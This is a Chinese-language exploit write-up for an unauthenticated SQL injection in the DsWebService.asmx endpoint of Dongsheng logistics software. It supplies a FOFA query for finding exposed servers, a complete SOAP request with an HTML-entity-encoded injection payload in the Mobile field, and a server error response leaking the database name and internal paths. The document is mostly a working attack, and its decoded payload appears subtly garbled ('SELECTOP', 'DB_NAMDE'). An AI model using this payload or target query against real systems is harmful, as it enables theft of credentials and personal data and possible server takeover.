## 东胜物流软件-DsWebService.asmx-sql注入漏洞

## 一、漏洞简介
东胜物流软件 DsWebService.asmx 接口存在SQL注入漏洞,未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
```

## POC
```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: ?
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Connection: close
Content-Length: auto
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"
Accept-Encoding: gzip

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
  <soap:Header/>
  <soap:Body>
    <dsw:GetSeaiBsDataList>
      <!--Optional:-->
      <dsw:LoginName>qdtaiize</dsw:LoginName>
      <!--Optional:-->
      <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
      <!--Optional:-->
      <dsw:Mobile>&#x31;&#x27;&#x20;&#x4f;&#x52;&#x20;&#x31;&#x3d;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x4f;&#x50;&#x20;&#x31;&#x20;&#x44;&#x42;&#x5f;&#x4e;&#x41;&#x4d;&#x44;&#x45;&#x28;&#x29;&#x29;&#x2d;&#x2d;</dsw:Mobile>
      <!--Optional:-->
      <dsw:MbIno>1</dsw:MbIno>
      <dsw:start>1</dsw:start>
      <dsw:limit>1</dsw:limit>
    </dsw:GetSeaiBsDataList>
  </soap:Body>
</soap:Envelope>
```

## POC
```
HTTP/1.1 500 Internal Server Error
Cache-Control: private
Content-Type: application/soap+xml; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Wed, 14 Jan 2026 02:23:02 GMT
Content-Length: auto

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" 
               xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <soap:Body>
    <soap:Fault>
      <soap:Code><soap:Value>soap:Receiver</soap:Value></soap:Code>
      <soap:Reason><soap:Text xml:lang="zh-CHS">System.Web.Services.Protocols.SoapException: 服务器无法处理请求。 ---> System.Data.SqlClient.SqlException: 在将 nvarchar 值 'ShippingWeb_QDWT5J' 转换成数据类型 int 时失败。
   在 DsWeb.DataAccess.SqlHelper.OpenSqlDataSet(String connectionString, String sqltext) 位置 D:\DONGSHENG7\DS7\DSWeb\DataAccess\SqlHelper.cs:行号 486
   在 DsWeb.EntityDA.T_ALL_DA.GetStrSQL(String strfield, String strSQL) 位置 D:\DONGSHENG7\DS7\DSWeb\EntityDA\T_ALL_DA.cs:行号 43
   在 DsWeb.DsWebService.DAL.DsWebServiceDAL.GetSeaiBsDataList(String LoginName, String LoginPass, String Mobile, String MbIno, Int32 start, Int32 limit) 位置 D:\DONGSHENG7\DS7\DSWeb\DAL\DsWebServiceDAL.cs:行号 950
   在 DsWebService.DsWebService.GetSeaiBsDataList(String LoginName, String LoginPass, String Mobile, String MbIno, Int32 start, Int32 limit) 位置 D:\DONGSHENG7\DS7\DSWeb\WebService\DsWebService.asmx.cs:行号 136
   --- 内部异常堆栈跟踪的结尾 ---
   在 System.Web.Services.Protocols.SoapHttpClientProtocol.ReadResponse(SoapClientMessage message, WebResponse response, Stream responseStream, Boolean asyncCall)
   在 System.Web.Services.Protocols.SoapHttpClientProtocol.Invoke(String methodName, Object[] parameters)
   在 DsWebService.DsWebService.GetSeaiBsDataList(String LoginName, String LoginPass, String Mobile, String MbIno, Int32 start, Int32 limit) 位置 c:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\c0a8a4f7\2b8a7d6b\App_Web_getseai bsdata list.asmx.cdcab7d2.dll:行号 0
   --- 内部异常堆栈跟踪的结尾 ---
   在 System.Web.Services.Protocols.SoapHttpClientProtocol.ReadResponse(SoapClientMessage message, WebResponse response, Stream responseStream, Boolean asyncCall)
   在 System.Web.Services.Protocols.SoapHttpClientProtocol.Invoke(String methodName, Object[] parameters)
   在 DsWebService.DsWebService.GetSeaiBsDataList(String LoginName, String LoginPass, String Mobile, String MbIno, Int32 start, Int32 limit) 位置 c:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\root\c0a8a4f7\2b8a7d6b\App_Web_getseai bsdata list.asmx.cdcab7d2.dll:行号 0</soap:Text></soap:Reason>
      <soap:Detail/>
    </soap:Fault>
  </soap:Body>
</soap:Envelope>
```
